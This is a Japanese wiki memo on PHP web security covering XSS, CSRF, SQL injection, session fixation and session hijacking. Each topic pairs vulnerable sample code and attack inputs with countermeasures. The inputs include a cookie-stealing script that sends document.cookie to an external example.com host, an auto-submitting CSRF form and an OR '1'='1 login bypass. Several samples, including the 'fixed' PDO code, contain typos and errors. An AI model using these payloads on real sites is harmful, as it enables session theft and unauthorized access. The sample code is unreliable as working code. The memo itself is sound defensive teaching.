* WEBアプリケーションセキュリティメモ [#g6c914e9]

#contents

** スクリプト挿入攻撃（ScriptInsertion） [#eba2c9fa]
【概要】~
サイトのコンテンツに対して、JavaScriptやVBScriptなどを挿入し、サイトを訪れた~
第三者に対して悪意あるコードを実行させる攻撃方法。~
~
【被害例】~
●ウィルスに感染させるような悪意あるサイトにリダイレクトされる。~
●COOKIEなどの情報を盗まれ、サイトの管理者権限を乗っ取られる。~
~
【サンプル】~
 // ポストデータの取得
 $post_data = "データです。<script>alert("攻撃を受けました")</script>";
 
 // 取得結果の出力
 echo <<<EOF
 <html>
 <body>
     $post_data
 </body> 
 </html>
 EOF;
~
【対策】~
出力時のエスケープによって攻撃コードを無効化する。
 // ポストデータの取得
 $post_data = "データです。<script>alert("攻撃を受けました")</script>";
 // エスケープ
 $post_data = htmlspecialchars($post_data, ENT_QUOTES, 'UTF-8');
 
 // 以下同様

** クロスサイトスクリプティング（Cross Site Scripting/XSS） [#o04f6573]
【概要】~
リンクを踏ませるなどの間接的な方法で悪意あるスクリプトを実行させる攻撃。~
スクリプト挿入攻撃と同様。違いは攻撃対象のサイトとは異なるサイトやメールなどの~
間接的な手段を介して悪意あるコードを実行させる点。~
~
【サンプル】~
 if (isset($_GET['username'])) {
     echo $_GET['username'] . "さんの運勢は○○です。";
 }
 // フォーム
 echo '<form action="">';
 echo 'お名前<input type="text" name="username">';
 echo '<input type="submit" value="占ってみる">';
 echo '</form>';
上記に対し、GETパラメータ「?username=<script>window.location.href="http://・・・";</script>」を埋め込んだリンクを悪意あるサイトに貼っておくだけで攻撃になってしまう~

【対策】~
出力時のエスケープによって攻撃コードを無効化する。~
 if (isset($_GET['username'])) {
     echo htmlspecialchars($_GET['username'], ENT_QUOTES, 'UTF-8') . "さんの運勢は○○です。";
 }
 // 以下同様

** クロスサイトリクエストフォージェリ（Cross Site Request Forgeries/CSRF） [#v4248b39]
【概要】~
ユーザが意図しない操作を、ユーザ自身の権限を用いて実行させる攻撃方法。~
【被害例】~
●「知らない間に自分のブログ記事を全て消してしまっていた」~
●「会員サイトのパスワードを知らない間に変更されていた」~
【サンプル】~
ログイン認証機能があるサイトでログインしたのち、別の悪意あるサイトをアクセス~
した場合、そのサイトが以下のような場合は削除が実行される。

 <html>
 <body onload="document.attack_form.submit()">
     <form name="attack_form" action="攻撃対象のサイトのファイル名" method="post">
     <input type="hidden" name="op" value="delete">
     <input type="submit" value="クリックしなくてもsubmitされます">
 </body>
 </html>

【対策】~
「ワンタイムトークン」「投稿・編集・削除などの操作の際にはパスワード認証をさせる」などがある。ここではワンタイムトークンの説明。~
フォームのhidden要素とセッション変数のそれぞれに不規則な文字列（トークン）を~
セットした上で、操作を実際に行う処理の最初にセッション変数とフォームから~
投稿された変数のトークンがただし組み合わせか確認する。~
チェックを行ったあと、セッション変数をクリアし、一回だけしか利用できないように~
する事で、操作を行うための画面遷移が正規の手順で行われている事を確認できる。~

** SQLインジェクション（SQL Injection） [#qe9c3be9]
【概要】~
データベースに対する命令文（SQL）に対して意図しない命令を挿入する~
データベースに保存されているデータを改ざんしたり、盗み出したりする攻撃。~
【サンプル】~
 function check_user($name, $pass)
 {
     $query = "SELECT * FROM users WHERE name = '$name' AND pass = '$pass'";
     $result = mysql_query($query);
     // 戻り値がfalseでなければOK
     if ($result !== false) {
         $rows = mysql_num_row($result);
         if ($rows >= 1) {
             return ture;
         }
     }
     return false;
 }
 $conn = mysql_connect('localhost', 'root', '');
 mysql_select_db('perfect');
 $result =　check_user($_POST['name'], $_POST['pass'])
上記のプログラムに対し、name="admin"、pass="' OR '1' = '1"などが入力されると~
認証がOKとなる。~
「SELECT * FROM users WHERE name = 'admin' AND pass = '' OR '1' = '1'」
【対策】~
プリペアドステートメントの利用で回避できる。新し目のPHPならばPDOを使うといい。~
MySQLiのmysqli_prepare()を使うより、こっちの方が簡単。~
以下のようにプリペアドステートメントが使えない状況でも、環境にあった~
エスケープ関数を入力された値に対し実行しておけば、対策はできる。~
 function check_user($dbh, $name, $pass)
 {
     $query = "SELECT * FROM users WHERE name = :name AND pass = :pass";
     $sth =　$dbh->prepare($query);
     $sth->bindParam(':name', $name, PDO::PARAM_STR);
     $sth->bindParam(':pass', $pass, PDO::PARAM_STR);
     $result = $sth->execute;
     // 戻り値がfalseでなければOK
     if ($result !== false) {
         $rows = mysql_num_row($result);
         if ($rows >= 1) {
             return ture;
         }
     }
     return false;
 }
 $dsn =　'mysql:dbname=perfect;host=localhost';
 $dbh = new PDO($dsn, 'root', '');
 $result =　check_user($dbh, $_POST['name'], $_POST['pass'])

** セッション固定攻撃 [#sd3247d4]
【概要】~
任意のセッションIDを強制的に利用させるのがセッション攻撃。~
セッションハイジャックを成立させるための手段として利用されることが多い。~
【サンプル】~
 // 認証用関数
 function check_auth () {
 	return true;
 }
 // セッション開始
 session start();
 header('Content-type: text/html; charset=utf-8');
 // ユーザIDがセッション変数に存在すれば、ログインユーザ専用ページを出力
 if (isseet($_SESSION['user_id'])) {
 	// ログイン専用ページを表示する
 	echo 'ログイン専用ページです。<br>';
 	echo 'あなたのセッションIDは　' . session_id() . 'です'; // 脆弱性の確認用
 } elseif(
 	strtolower($_SERVER['REQUEST_METHOD']) === 'post'
 	&& isset($_POST['op'])  === true
 	&& $_POST['op'] === 'login'
 	&& check_auth === true
 	) {
 	// セッションIDがなければ、認証を行う
 	// ログイン処理の実行開始
 	// ・・・
 	// ログイン処理の実行終了
 	$_SESSION['user_id'] = 1; // ダミーのユーザIDをセッションに格納
 	// ログイン成功画面を出力
 	$script = basename($_SERVER['SCRIPT_FILENAME']);
 	echo <<<EOF
 <html>
 <head>
 <title>ログイン成功</title>
 <meta http-equiv="refresh" content="3; url=./{$script}">
 </head>
 <body>
 ログインに成功しました
 </body>
 </html>
 EOF;
 
 } else {
 	// ログインフォームを表示する
 	echo <<<EOF
 <form action="" method="post">
 <input type="hidden" name="op" value="login">
 <input type="submit" name="login_button" value="ログイン">
 </form>
 EOF;
 }

上記プログラムに対し、クッキーを削除して、「?PHPSESSIONID=1234567890abcdefghijklmnopqrstuv」をURLの後ろにつけて~
アクセスすると、ログイン画面が表示される。そこでまたログインする。~
別のブラウザを立ち上げるか、クッキーを削除して、もう一度~「?PHPSESSIONID=1234567890abcdefghijklmnopqrstuv」へアクセス。~
するとログイン処理を行っていないのに、ログインユーザ専用画面が表示される。~
「セッションアダプション」と呼ばれる脆弱性。~
これにより、固定のセッションでログイン状態を確立させ、別ブラウザ（別ユーザ）~
で、その固定セッションでアクセスするとそのログインユーザ~
権限でログインがされ、操作ができてしまう。~

同様に「Cookie Monster バグ」というクッキーに意図するIDを埋め込んで~
セッション固定攻撃をするものもある。~
~
■Cookie Monster バグ~
ブラウザの不具合を利用して、「.co.jp」「.gr.jp」などのセカンドレベルドメインに~
対しての任意のクッキーをセットする攻撃方法。~
クロスドメインクッキーインジェクション（Cross Domain Cookie Injection）~
ともいう。~
ブラウザの不具合なので、最新版を使っていれば問題はないが、存在は覚えておく。~
~

【対策】~
ログイン前とログイン後で同じセッションIDを利用しているために、成立してしまうので、ログイン後にセッションIDを再発行する。

 // ログイン処理の実行終了
 $_SESSION['user_id'] = 1; // ダミーのユーザIDをセッションに格納
 session_regenerate_id(true); // <セッションIDを再発行
 // ログイン成功画面を出力

** セッションハイジャック [#i845395a]
【概要】~
上記のセッション固定攻撃などにより、何らかの方法で取得したセッションIDを~
利用して、ユーザのセッションを奪い取る攻撃。~
【脆弱性】~
・リファラの漏洩~
・XSSによるセッションIDの入手~
・セッション固定攻撃によるセッションIDの強制~
~
①リファラによるセッションIDの漏洩
PHPのセッション管理方法は主に、クッキーによる管理（デフォルト）と、~
GET・POST変数で管理する方法に２種類ある。~
session.use_cookies セッションIDの管理にクッキーを使用するか １（有効）~
session.use_only_cookies セッションIDの管理にクッキーのみを使用するか ０（無効）※PHP5.3.0からは１（有効）~
session.use_trans_sid クッキーが利用できない場合にGET・POST変数によるセッション管理を行うか ０（無効）~
~
セッションの管理方法が下記、の場合リファラから漏れる場合がある。~
session.use_only_cookies ０（無効）~
session.use_trans_sid １（有効）~
~
②XSSによるセッションIDの入手~
 session_start();
 if (isset($_SESSION['count']) !== true) {
 	$_SESSION['count'] = 0;
 }
 
 if (isset($_GET['keyword']) === true && $_GET['keyword'] !== '') {
 	$_SESSION['count']++;
 	$message = 'あなたが入力したキーワードは['
 			. $_GET['keyword'] . ']です。<br>';
 } else {
 	$message = 'キーワードは入力されてません。<br>';
 }
 	$massage .= 'あなたがキーワードを入力したのは'
 			. $_SESSION['count'] . '回目です。<br>';
 
 // キーワード入力フォーム
 echo <<< EOF
 <html>
 	<head>
 		<title>キーワード表示画面</title>
 	</head>
 	<body>
 		{$message}<br>
 		<br>
 		<form action="">
 			<input type="text" name="keyword" value="">
 			<input type="submit" value="投稿">
 		</form>
 	</body>
 </html>
 EOF;

上記サンプルプログラムに対して、「?keyword=<script>localhost.href="http://example.com/session_hijack.php?"+document.cookie;</script>」を~
URLの後ろに付与してアクセスすると、「http://example.com/session_hijack.php?PHPSESSID=****」にリダイレクトされる。~
この時点で、ダミーサイトなどにクッキーに保存してある情報が記録されるので、~
その情報からセッションを奪われる。~
~
③セッション固定攻撃によるセッションIDの強制~
セッションIDを指定した状態で、ログインするページへアクセスさせる。~
その後アクセスしたサイトでログインを行ってしまうと、指定したセッションIDでの~
ログインが確立してしまうので、それを利用してログインされてしまう。~
~
【対策】~
・セッションIDをクッキーのみで扱う~
下記設定をphp.iniや.htaccess、ini_set()関数でセッションに関する値を以下のように~
設定する。~
session.use_cookies = 1~
session.use_only_cookies = 1~
session.use_trans_sid = 0~
・セッションハイジャックのチェック
Accept-Charset、Accept-Language、User-Agentを元に、生成した乱数をセッションに~
保持し、セッション開始の直後にセッション内の値とアクセスしてきた情報をもとに生成した乱数の整合性チェックをおこう。~
・多重にパスワードを入れる。
